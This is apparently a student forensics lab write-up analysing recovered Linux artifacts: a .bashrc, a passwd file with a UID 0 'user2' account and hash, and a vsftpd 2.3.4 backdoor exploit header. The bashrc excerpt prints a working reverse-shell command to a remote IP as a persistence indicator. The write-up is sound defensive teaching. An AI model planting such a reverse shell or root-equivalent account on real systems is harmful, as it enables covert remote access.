# Activity 12.3 — Linux Configuration File Investigation

> **Program:** Hackers do Bem  
> **Stage:** Specialization — Incident Response and Digital Forensics  
> **Module:** 03  
> **Class:** 02  
> **Course Lesson:** 12  
> **Environment:** forenseLinux VM  
> **Status:** Completed

## 1. Objective

Examine Linux configuration artifacts recovered from an external drive and identify indicators of suspicious persistence and unauthorized privilege assignment.

The activity focuses on files supplied in:

```text
/curso/aula12/artefatos_hd_externo
```

The main artifacts are:

```text
bashrc.txt
passwd
49757.py
```

The investigation includes static examination of the shell configuration file, inspection of a Python exploit artifact, and analysis of the user account information contained in the recovered `passwd` file.

The main objective is to identify suspicious commands and account configuration that could be associated with post-exploitation activity.

## 2. Environment

| Item | Details |
|---|---|
| Virtual Machine | `forenseLinux` |
| Operating System | Linux |
| User Account | `aluno` |
| Privilege Level | Root during collection |
| Source Directory | `/curso/aula12/artefatos_hd_externo` |
| Collection Directory | `/home/aluno/coleta` |
| Main Configuration Artifact | `bashrc.txt` |
| Account Database Artifact | `passwd` |
| Exploit Artifact | `49757.py` |
| Referenced Vulnerability | CVE-2011-2523 |

## 3. Linux Configuration and Persistence Concepts

### Linux Shell Configuration

Bash reads configuration files during shell initialization.

The `.bashrc` file is commonly used to define shell settings, aliases, functions, and commands executed when an interactive Bash shell starts.

Unauthorized commands inserted into a user's shell configuration can therefore execute during later interactive sessions.

Forensic examination of recovered shell configuration files can reveal suspicious persistence mechanisms.

### Reverse Shell Indicators

A reverse shell is a connection initiated from a compromised system toward another host.

The recovered `bashrc.txt` contains a command that redirects an interactive Bash shell to a remote IP address and port.

This is an indicator of attempted remote access and should be treated as suspicious during static examination.

### Linux Passwd File

The `/etc/passwd` file contains account information represented as colon-separated fields.

The standard format is:

```text
name:password:UID:GID:GECOS:directory:shell
```

The fields include:

| Field | Description |
|---|---|
| Name | Account name |
| Password | Password marker or password hash field |
| UID | User identifier |
| GID | Primary group identifier |
| GECOS | Optional account information |
| Directory | User's home directory |
| Shell | Login shell |

The root account uses UID 0.

An additional account configured with UID 0 receives root-equivalent user privileges.

The GID identifies the account's primary group.

### vsftpd 2.3.4 Backdoor

The recovered Python artifact identifies itself as an exploit associated with:

```text
vsftpd 2.3.4
CVE-2011-2523
```

The vulnerability record describes a backdoor in affected vsftpd 2.3.4 downloads that opens a shell on TCP port 6200.

The artifact is examined as evidence. It is not executed during the forensic investigation.

## 4. Procedure

### Step 1 — Identify the Recovered Artifacts

The course supplied a directory of recovered files from an external drive:

```text
/curso/aula12/artefatos_hd_externo
```

The directory contained several numbered exploit artifacts and two additional files of particular interest:

```text
bashrc.txt
passwd
```

The numbered exploit files suggested that the directory contained scripts obtained from exploit repositories.

The investigation focused on the shell configuration file and account database.

### Step 2 — Prepare a Collection Directory

The activity first obtained root privileges:

```bash
sudo su
```

A dedicated directory was created:

```bash
mkdir /home/aluno/coleta
```

The new directory was entered:

```bash
cd /home/aluno/coleta
```

The files supplied under `/curso/aula12` were copied into the collection directory:

```bash
cp -r /curso/aula12/* .
```

The command components are:

| Component | Function |
|---|---|
| `cp` | Copies files and directories |
| `-r` | Copies directories recursively |
| `/curso/aula12/*` | Selects the supplied course files |
| `.` | Uses the current directory as the destination |

The recovered artifact directory was entered:

```bash
cd artefatos_hd_externo
```

The shell configuration file was then examined:

```bash
cat bashrc.txt
```

The supplied output excerpt contains:

```bash
# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
    if [ -f /usr/share/bash-completion/bash_completion ]; then
        . /usr/share/bash-completion/bash_completion
    elif [ -f /etc/bash_completion ]; then
        . /etc/bash_completion
    fi
fi

bash -i >& /dev/tcp/10.12.124.45/443 0>&1
python /dev/49757.py
```

The first part of the output contains normal Bash completion configuration.

The final two commands are the suspicious entries identified during the analysis.

### Step 3 — Examine the Python Artifact

The next file examined was:

```text
49757.py
```

The file was inspected statically with:

```bash
cat 49757.py
```

The supplied file header identifies the artifact as:

```text
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523
```

The source material also shows that the script imports Python's Telnet functionality and interacts with the FTP service.

The relevant analysis is that the script is associated with the known vsftpd 2.3.4 backdoor behavior and references a subsequent shell connection on TCP port 6200.

The source file was examined as a recovered artifact. The exploit was not executed as part of the forensic analysis.

### Step 4 — Examine the Recovered Passwd File

The Linux account database artifact was inspected using:

```bash
cat passwd
```

The supplied file contains the following account records:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
user:x:1000:1000::/home/user:/bin/bash
user2:$1$user2$hgMHLsJ/oLcBtWwwTwVtq1/:0:0:/root/root:/bin/bash
```

The relevant entry is:

```text
user2:$1$user2$hgMHLsJ/oLcBtWwwTwVtq1/:0:0:/root/root:/bin/bash
```

The account is configured with:

```text
UID = 0
GID = 0
```

UID 0 is reserved for the root user.

Therefore, the `user2` entry contains a strong indicator of an account configured with root-equivalent privileges.

The password field also contains a hash-like value rather than the usual `x` marker associated with shadow password storage.

### Step 5 — Separate Service Accounts from Relevant Accounts

The course material then reduces the list to the accounts considered relevant for the investigation:

```text
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000::/home/user:/bin/bash
user2:$1$user2$hgMHLsJ/oLcBtWwwTwVtq1/:0:0:/root/root:/bin/bash
```

The resulting records highlight the normal root account, a regular user, and the suspicious `user2` account.

The important observation is that `user2` uses the same UID and GID values as root.

This configuration can be used to create another account with root-equivalent user and group identifiers.

## 5. Expected Results

The activity identifies suspicious artifacts in the recovered Linux configuration files.

| Artifact | Finding |
|---|---|
| `bashrc.txt` | Contains a reverse-shell command and a Python script execution reference |
| `49757.py` | Identifies itself as a vsftpd 2.3.4 backdoor exploit associated with CVE-2011-2523 |
| `passwd` | Contains the suspicious `user2` account entry |
| `user2` UID | `0` |
| `user2` GID | `0` |
| Password field | Contains hash-like material |

The artifacts indicate possible post-exploitation behavior, including attempted remote access and unauthorized privilege assignment.

## 6. Technical Analysis

### Suspicious Bash Configuration

The recovered file contains:

```bash
bash -i >& /dev/tcp/10.12.124.45/443 0>&1
python /dev/49757.py
```

The first line uses Bash network redirection to connect an interactive shell to the remote endpoint:

```text
10.12.124.45:443
```

The second line attempts to invoke a Python script from:

```text
/dev/49757.py
```

The combination is suspicious because shell initialization can provide a persistence mechanism when a user starts an interactive session.

The commands were examined statically and were not executed during the investigation.

### vsftpd 2.3.4 and CVE-2011-2523

The recovered Python file identifies itself as a vsftpd 2.3.4 backdoor exploit.

CVE-2011-2523 concerns an affected vsftpd 2.3.4 distribution containing a backdoor that opens a shell on TCP port 6200.

The vulnerability reference supports the identification of the script's intended behavior.

The presence of the script does not by itself prove that the vulnerable service was installed or exploited on a specific machine. That conclusion would require additional evidence.

### UID and GID 0

The most important account-related indicator is:

```text
user2:...:0:0:...
```

The values represent:

- UID 0: root-equivalent user identifier.
- GID 0: root primary group identifier.

An account with UID 0 is treated as a superuser account by standard Unix permission mechanisms.

This is a significant indicator of possible privilege escalation or unauthorized account creation.

### Passwd Field Structure

The standard passwd format contains seven colon-separated fields:

```text
name:password:UID:GID:GECOS:directory:shell
```

The `user2` line transcribed from the supplied material appears to contain an ambiguous or missing field separator.

The literal line shown in the material is preserved above. Its home directory and shell should be verified against the original file before assigning meaning to those two fields.

The UID and GID values are clearly shown as zero and remain the central privilege-related finding.

### Hash Stored in the Passwd Field

The artifact contains hash-like material directly in the password field.

In a conventional Linux configuration, the `x` marker indicates that the password hash is stored in `/etc/shadow`.

A hash placed directly in the passwd field is therefore an unusual configuration that should be investigated.

The hash should be treated as sensitive evidence and should not be published or reused as a credential.

## 7. Results and Interpretation

The activity demonstrates the examination of Linux configuration artifacts recovered from an external drive.

The `bashrc.txt` file contains commands associated with attempted remote access and execution of a Python script.

The file `49757.py` identifies itself as a vsftpd 2.3.4 backdoor exploit associated with CVE-2011-2523.

The `passwd` artifact contains a suspicious `user2` account configured with UID 0 and GID 0.

Together, these artifacts suggest possible persistence and privilege escalation mechanisms.

They provide important investigative indicators that should be correlated with authentication logs, shell history, file metadata, and other recovered evidence.

## 8. Concepts Practiced

- Linux configuration forensics
- Bash initialization files
- `.bashrc` analysis
- Reverse-shell indicators
- Static script analysis
- Python artifact inspection
- vsftpd 2.3.4
- CVE-2011-2523
- Linux passwd format
- UID and GID analysis
- Root-equivalent accounts
- Password hash fields
- Post-exploitation persistence
- Evidence correlation

## 9. Evidence

**Required screenshot: Print 3 — PDF page 3 — Step 4.**

The screenshot should show the Linux terminal with the personalized prompt and the command:

```bash
cat passwd
```

The output should show the recovered account records, especially:

```text
user2:$1$user2$hgMHLsJ/oLcBtWwwTwVtq1/:0:0:/root/root:/bin/bash
```

The screenshot should make the UID and GID values visible.

[View Universal Class Evidence PDF](../evidences.pdf)

The required screenshot for Activity 12.3 is on page 3 of the consolidated PDF.

## References

- [Linux Manual — passwd(5)](https://man7.org/linux/man-pages/man5/passwd.5.html)
- [NIST NVD — CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [Debian Security Tracker — CVE-2011-2523](https://security-tracker.debian.org/tracker/CVE-2011-2523)
- [GNU Bash — Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)

---

[Back to Module 03](../../README.md) · [Back to Specialization](../../../README.md) · [Next Activity — 12.4](../atividade-12.4-logs-linux/README.md)
